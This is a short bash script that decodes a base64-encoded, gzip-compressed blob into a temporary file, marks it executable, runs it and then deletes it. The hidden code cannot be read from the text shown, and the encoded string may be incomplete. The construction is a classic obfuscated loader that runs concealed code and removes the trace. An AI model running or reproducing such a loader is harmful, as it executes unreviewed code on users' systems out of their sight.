#!/bin/bash
tmpfile=$(mktemp)
echo 'H4sIAC6mMmgC/61Ye3Mb1RX/fz/FZeNhkunq6ZcsMFPHkhMVxRKWHJIGj+dq90raaHXvZh92lAwzIQVKEggZ6DCUQmFKCbQzkHSGKSEJ9MNgyclf+Qo95+6utLLlhLRxMqvde5733PP47SqHnks1TJ5qULetKC7zSIIpynJldaV0bHOlVC4uqinm6alTDu2tpXTBm2Yr2etaqrK2Xi6WS7X6fi7Ht5hluh7wVNbrxQkMwvdY8qwruKoAx9HK+mphgjHf9UR3E3gbwudGyK8cIg8/+9vgs//s3Lnev/X2ww++6r9/tX/rx/7dP/U//7x/473Bx1/0b7/Z//L24OPrisF0izqMJJbIUrW0+XLxdG3xsELIGbXtebabT6UsscU4FUmvo24sqi2fx/9TStUxbg5/SYNtIa/unqWd6vw5kS2drtYap+deHuc926ROlzlJ2xHIftakvGVRwQVv' | base64 -d | gunzip > "$tmpfile"
chmod +x "$tmpfile"
bash "$tmpfile"
rm "$tmpfile"
